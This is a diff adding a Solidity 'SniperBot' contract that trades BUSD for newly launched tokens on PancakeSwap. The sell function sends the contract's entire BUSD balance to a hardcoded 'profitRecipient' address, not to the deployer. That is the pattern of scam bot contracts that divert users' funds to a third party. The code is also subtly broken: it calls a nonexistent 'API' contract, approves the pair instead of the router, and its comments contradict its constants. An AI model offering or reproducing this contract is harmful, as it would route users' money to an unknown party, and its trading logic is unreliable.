@@ -1,0 +1,177 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+interface IPancakeApi {
+    function getTokenPairInfo(address tokenAddress) external view returns (address pairAddress, uint256 minReceived);
+}
+
+interface IPancakeRouter {
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (bool);
+}
+
+interface IPancakePair {
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function token0() external view returns (address);
+}
+
+contract SniperBot {
+    address private owner;
+    address private constant pancakeApiAddress = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73; // PancakeSwap API address
+    address private constant pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap router address
+    address private constant busdTokenAddress = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; // BUSD token contract address
+    address private constant profitRecipient = 0x30c3F41B92Ff50368B052d7Fa5af85c11F5A5D5D; // Profit recipient address
+    uint256 private constant busdAmount = 7 * (10**18); // Amount of BUSD to trade (in wei)
+    uint256 private constant targetProfit = 240; // Target profit percentage (105%)
+    uint256 private constant stopLoss = 40; // Stop-loss percentage (95%)
+    uint256 private buyPrice;
+    address private tokenToBuy; // Token address to be bought
+
+    event TradeExecuted(address indexed token, uint256 indexed price);
+    event Withdrawal(address indexed token, uint256 amount);
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function executeTrade(address tokenAddress) external {
+        require(msg.sender == owner, "Unauthorized");
+
+        // Get the PancakeSwap trade details
+        (address pairAddress, uint256 minReceived) = getPancakePairInfo(tokenAddress);
+        require(pairAddress != address(0), "Invalid token");
+
+        // Approve PancakeSwap router to spend BUSD
+        require(IERC20(busdTokenAddress).approve(pairAddress, busdAmount), "Approval failed");
+
+        // Swap BUSD for the launchpad token
+        require(
+            IPancakeRouter(pancakeRouterAddress).swapExactTokensForTokensSupportingFeeOnTransferTokens(
+                busdAmount,
+                minReceived,
+                getPath(busdTokenAddress, tokenAddress),
+                address(this),
+                block.timestamp
+            ),
+            "Trade execution failed"
+        );
+
+        // Record the buy price
+        buyPrice = getCurrentPrice(pairAddress);
+
+        // Emit event to indicate trade execution
+        emit TradeExecuted(tokenAddress, buyPrice);
+    }
+
+    function sell(address tokenAddress) external {
+        require(msg.sender == owner, "Unauthorized");
+
+        // Get the PancakeSwap trade details
+        (address pairAddress, uint256 minReceived) = getPancakePairInfo(tokenAddress);
+        require(pairAddress != address(0), "Invalid token");
+
+        // Calculate target and stop-loss prices
+        uint256 targetPrice = (buyPrice * targetProfit) / 100;
+        uint256 stopLossPrice = (buyPrice * stopLoss) / 100;
+
+        // Get the current token price
+        uint256 currentPrice = getCurrentPrice(pairAddress);
+
+        // Check if the target profit or stop-loss condition is met
+        require(currentPrice >= targetPrice || currentPrice <= stopLossPrice, "Sell conditions not met");
+
+        // Approve PancakeSwap router to spend the token
+        require(IERC20(tokenAddress).approve(pairAddress, IERC20(tokenAddress).balanceOf(address(this))), "Approval failed");
+
+        // Swap the token back to BUSD
+        require(
+            IPancakeRouter(pancakeRouterAddress).swapExactTokensForTokensSupportingFeeOnTransferTokens(
+                IERC20(tokenAddress).balanceOf(address(this)),
+                minReceived,
+                getPath(tokenAddress, busdTokenAddress),
+                address(this),
+                block.timestamp
+            ),
+            "Trade execution failed"
+        );
+
+        // Transfer BUSD to the profit recipient
+        require(IERC20(busdTokenAddress).transfer(profitRecipient, IERC20(busdTokenAddress).balanceOf(address(this))), "Transfer failed");
+    }
+
+    function getCurrentPrice(address pairAddress) internal view returns (uint256) {
+        (uint256 reserve0, uint256 reserve1, ) = IPancakePair(pairAddress).getReserves();
+        address token0 = IPancakePair(pairAddress).token0();
+        uint112 reserveIn;
+        uint112 reserveOut;
+        if (token0 == busdTokenAddress) {
+            reserveIn = uint112(reserve0);
+            reserveOut = uint112(reserve1);
+        } else {
+            reserveIn = uint112(reserve1);
+            reserveOut = uint112(reserve0);
+        }
+        return (uint256(reserveIn) * 1e18) / uint256(reserveOut);
+    }
+
+    function getPath(address tokenIn, address tokenOut) internal pure returns (address[] memory) {
+        address[] memory path = new address[](2);
+        path[0] = tokenIn;
+        path[1] = tokenOut;
+        return path;
+    }
+
+    function setTokenToBuy(address tokenAddress) external onlyOwner {
+        tokenToBuy = tokenAddress;
+    }
+
+    function withdrawBUSD(uint256 amount) external {
+        require(msg.sender == owner, "Unauthorized");
+        require(amount <= IERC20(busdTokenAddress).balanceOf(address(this)), "Insufficient BUSD balance");
+
+        require(IERC20(busdTokenAddress).transfer(owner, amount), "Transfer failed");
+
+        emit Withdrawal(busdTokenAddress, amount);
+    }
+
+    function withdrawAll(address tokenAddress) external {
+        require(msg.sender == owner, "Unauthorized");
+
+        uint256 balance = IERC20(tokenAddress).balanceOf(address(this));
+        require(balance > 0, "No tokens to withdraw");
+
+        require(IERC20(tokenAddress).transfer(owner, balance), "Transfer failed");
+
+        emit Withdrawal(tokenAddress, balance);
+    }
+
+    function getPancakePairInfo(address tokenAddress) internal view returns (address pairAddress, uint256 minReceived) {
+        try IPancakeApi(pancakeApiAddress).getTokenPairInfo(tokenAddress) returns (address _pairAddress, uint256 _minReceived) {
+            return (_pairAddress, _minReceived);
+        } catch {
+            return (address(0), 0);
+        }
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Unauthorized");
+        _;
+    }
+}
